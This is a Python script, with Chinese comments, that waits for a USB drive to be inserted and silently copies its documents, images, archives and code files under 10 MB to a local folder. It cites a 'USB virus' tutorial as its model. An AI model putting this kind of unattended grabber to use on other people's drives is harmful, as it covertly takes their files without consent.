#coding=utf-8
#复制一个新插入的U盘里的特定类型文件数据到本地
from time import sleep
import os
import re
import shutil
from win32file import GetLogicalDrives,GetDriveType

def ucopyOne(): #思路一,需要指定好usb_path 有可能会是 h://
	usb_path = 'g://'
	up2='h:/'
	spath='L:/GIStrain/20171207/'
	while True:
		if os.path.isdir(usb_path):  # 如果发现异常，即多出一个文件夹，则退出
			break; #true 就结束循环
		sleep(3)
		print(usb_path)
	#copyAllData(usb_path, spath)
	copyFilterData(usb_path, spath)
	print('done')

def ucopyTwo():#思路二
	drive_all = ["A://", "B://", "C://", "D://", "E://", "F://", "G://", "H://", "I://",
	             "J://", "K://", "L://", "M://", "N://", "O://", "P://", "Q://", "R://",
	             "S://", "T://", "U://", "V://", "W://", "X://", "Y://", "Z://"]
	drives = getDrives()  # 电脑NTFS文件系统磁盘列表
	print('drives list:',drives)
	spath = "L:/GIStrain/20171207/"  # 新文件保存的位置
	iscopyed=False
	while not iscopyed:
		for d in drive_all:
			if d not in drives:
				if os.path.isdir(d):  # 如果发现出现了U盘符
					copyFilterData(d, spath)
					print('copy ',d)
					print('save at',spath)
					iscopyed=True
		sleep(3)
		print('www...')


'''思路一：一直扫描某个路径，如果多出一个文件夹或路径，退出循环，进入复制代码；教程的做法
思路2：一直对磁盘名循环，当某个原来不在本地磁盘中出现（从false变成true），记录盘符，对其中文件进行复制
'''

def copyAllData(upath,spath):
	shutil.copytree(upath, spath+'newUSBw/')#这种情况下的文件夹是新文件夹 如果文件夹已存在会报错

def copyFilterData(upath,spath):
	rgxfname = re.compile('(.*png$)|(.*jpg$)|(.*jpeg$)|(.*zip$)|(.*rar$)'
	                      '|(.*doc$)|(.*docx$)|(.*ppt$)|(.*pptx$)'
	                      '|(.*xls$)|(.*xlsx$)|(.*epub$)|(.*pdf$)'
	                      '|(.*py$)|(.*R$)|(.*md$)|(.*txt$)')
	limitSize=10*1024*1024  #10MB
	for root, dirs, files in os.walk(upath):  # MyUSB location
		for name in files:
			file = os.path.join(root, name)
			if rgxfname.match(file) and os.path.getsize(file) < limitSize:
				shutil.copy2(file, spath) #里面有同名文件会直接覆盖


def getDocSize(path):
    try:
        size = os.path.getsize(path)
        return size #
    except Exception as err:
        print(err)
        return 2**10*1024  #1024

def convert_bytes(num):
	#this function will convert bytes to MB.... GB... etc
    for x in ['bytes', 'KB', 'MB', 'GB', 'TB']:
        if num < 1024.0:
            return "%3.1f %s" % (num, x)
        num /= 1024.0

#convert_bytes(getDocSize('somemovie.rmvb')) #1.3 GB

def getDrives():
	drives = []
	sign = GetLogicalDrives() #type==int

	drive_all = ["A://", "B://", "C://", "D://", "E://", "F://", "G://", "H://", "I://",
	             "J://", "K://", "L://", "M://", "N://", "O://", "P://", "Q://", "R://",
	             "S://", "T://", "U://", "V://", "W://", "X://", "Y://", "Z://"]
	for i in range(25):
		if (sign & 1 << i):
			if GetDriveType(drive_all[i]) == 3:
				drives.append(drive_all[i])
	#print('drives:',drives) #list
	return drives



#ucopyOne()
ucopyTwo()

'''
def is_UDisk(drives):
    UDisk=[]
    for item in drives:
        try :
            free_bytes,total_bytes,total_free_bytes=win32file.GetDiskFreeSpaceEx(item)
            if (total_bytes/1024/1024/1024)<17:
                UDisk.append(item)
        except :
            break
    print(UDisk)
    return UDisk

'''
'''
win32file只能读取NTFS文件系统的硬盘 U盘是FAT32
所以电脑上有多个系统，有windows不支持的文件系统时，win32file那里会报错

参考：[十行代码--用python写一个USB病毒 (知乎 DeepWeaver) - 掘金or知乎]()

linux下:
from time import sleep
import os, shutil
usb_path = "/Volumes/"
content = os.listdir(usb_path) # os.listdir(路径)返回路径下所有文件以及文件夹的名称
while True:
    new_content = os.listdir(usb_path) #每隔三秒扫描一次/Volumes/
    if new_content != content: # 如果发现异常，即多出一个文件夹，则退出
        break;
    sleep(3)
x = [item for item in new_content if item not in content]
# 找到那个新文件夹，返回包括新文件夹string类型名称的列表，这个表达方法很pythonic
shutil.copytree(os.path.join(usb_path, x[0]), '/Users/home/usb_copy')
# shutil.copytree 把目录下所有东西一股脑复制进/Users/home/usb_copy,
# 放进了自己的home目录下
'''








